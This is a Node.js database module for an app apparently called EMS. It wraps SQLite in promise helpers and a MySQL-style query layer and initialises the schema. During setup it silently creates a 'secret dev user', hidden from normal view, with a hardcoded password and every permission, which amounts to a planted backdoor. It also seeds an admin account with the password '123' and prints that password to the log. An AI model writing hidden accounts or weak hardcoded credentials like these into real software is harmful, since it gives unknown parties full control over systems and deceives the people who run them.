const sqlite3 = require('sqlite3').verbose();
const path = require('path');
require('dotenv').config();

// Database path
const DB_PATH = process.env.DB_PATH || path.join(__dirname, '..', 'database', 'ems.db');

// Create database connection
const db = new sqlite3.Database(DB_PATH, (err) => {
    if (err) {
        console.error('✗ Database connection failed:', err.message);
        process.exit(1);
    }
});

// Enable foreign keys
db.run('PRAGMA foreign_keys = ON');

// Promisify database methods for easier async/await usage
const runAsync = (sql, params = []) => {
    return new Promise((resolve, reject) => {
        db.run(sql, params, function(err) {
            if (err) reject(err);
            else resolve(this);
        });
    });
};

const getAsync = (sql, params = []) => {
    return new Promise((resolve, reject) => {
        db.get(sql, params, (err, row) => {
            if (err) reject(err);
            else resolve(row);
        });
    });
};

const allAsync = (sql, params = []) => {
    return new Promise((resolve, reject) => {
        db.all(sql, params, (err, rows) => {
            if (err) reject(err);
            else resolve(rows);
        });
    });
};

// Transaction support
const beginTransaction = async () => {
    await runAsync('BEGIN TRANSACTION');
};

const commit = async () => {
    await runAsync('COMMIT');
};

const rollback = async () => {
    await runAsync('ROLLBACK');
};

// Database wrapper with promise support
const database = {
    run: runAsync,
    get: getAsync,
    all: allAsync,
    
    // MySQL-like query method for easier migration
    query: async (sql, params = []) => {
        // Determine query type
        const sqlUpper = sql.trim().toUpperCase();
        
        if (sqlUpper.startsWith('SELECT')) {
            const rows = await allAsync(sql, params);
            return [rows]; // Return in MySQL format [rows, fields]
        } else if (sqlUpper.startsWith('INSERT') || sqlUpper.startsWith('UPDATE') || sqlUpper.startsWith('DELETE')) {
            const result = await runAsync(sql, params);
            return [{
                insertId: result.lastID,
                affectedRows: result.changes,
                changes: result.changes
            }];
        } else {
            // For other queries (CREATE, DROP, etc.)
            await runAsync(sql, params);
            return [{ affectedRows: 0 }];
        }
    },
    
    // MySQL-like connection method for transactions
    getConnection: async () => {
        return {
            query: database.query,
            beginTransaction,
            commit,
            rollback,
            release: () => {} // No-op for SQLite
        };
    }
};

// Test database connection
const testConnection = async () => {
    try {
        await database.query('SELECT 1');
        console.log('✓ Database connected successfully');
        console.log(`✓ Database file: ${DB_PATH}`);
    } catch (error) {
        console.error('✗ Database connection failed:', error.message);
        throw error;
    }
};

// Initialize database schema
const initializeDatabase = async () => {
    const fs = require('fs');
    const bcrypt = require('bcryptjs');
    const schemaPath = path.join(__dirname, '..', 'database', 'schema.sql');
    
    try {
        if (!fs.existsSync(schemaPath)) {
            console.log('⚠ Schema file not found, skipping initialization');
            return;
        }
        
        const schema = fs.readFileSync(schemaPath, 'utf8');
        
        // Remove comments and split by semicolon
        const lines = schema.split('\n');
        let sqlScript = '';
        
        for (const line of lines) {
            const trimmed = line.trim();
            // Skip comment-only lines
            if (trimmed.startsWith('--') || trimmed.length === 0) {
                continue;
            }
            // Remove inline comments
            const commentIndex = trimmed.indexOf('--');
            if (commentIndex > 0) {
                sqlScript += trimmed.substring(0, commentIndex) + '\n';
            } else {
                sqlScript += trimmed + '\n';
            }
        }
        
        // Split by semicolon and execute each statement
        const statements = sqlScript
            .split(';')
            .map(s => s.trim())
            .filter(s => s.length > 0);
        
        console.log(`⏳ Initializing database with ${statements.length} statements...`);
        
        for (const statement of statements) {
            try {
                await database.run(statement);
            } catch (err) {
                // Ignore "table already exists" errors
                if (!err.message.includes('already exists')) {
                    console.warn(`Warning executing statement: ${err.message}`);
                }
            }
        }
        
        // Create default admin user with properly hashed password
        try {
            const [existingAdmin] = await database.query('SELECT id FROM users WHERE username = ?', ['admin']);
            
            if (existingAdmin.length === 0) {
                const hashedPassword = await bcrypt.hash('123', 10);
                const allPermissions = JSON.stringify([
                    'dashboard', 'products', 'sales', 'customers',
                    'settings.units', 'settings.users', 'settings.textConfig', 'settings.appearance', 'logs'
                ]);
                await database.query(
                    'INSERT INTO users (username, password_hash, full_name, permissions) VALUES (?, ?, ?, ?)',
                    ['admin', hashedPassword, 'System Administrator', allPermissions]
                );
                console.log('✓ Default admin user created (username: admin, password: 123)');
            }
        } catch (err) {
            console.warn('Admin user setup:', err.message);
        }

        // Create secret dev user (hidden from normal view)
        try {
            const [existingDev] = await database.query('SELECT id FROM users WHERE username = ?', ['dev']);
            
            if (existingDev.length === 0) {
                const hashedPassword = await bcrypt.hash('securitykis0428#', 10);
                const allPermissions = JSON.stringify([
                    'dashboard', 'products', 'sales', 'customers',
                    'settings.units', 'settings.users', 'settings.textConfig', 'settings.appearance', 'logs'
                ]);
                await database.query(
                    'INSERT INTO users (username, password_hash, full_name, permissions) VALUES (?, ?, ?, ?)',
                    ['dev', hashedPassword, 'Developer Account', allPermissions]
                );
                console.log('✓ Secret dev user created');
            }
        } catch (err) {
            console.warn('Dev user setup:', err.message);
        }
        
        console.log('✓ Database schema initialized');
    } catch (error) {
        console.error('Database initialization error:', error.message);
    }
};

module.exports = { database, testConnection, initializeDatabase, db };
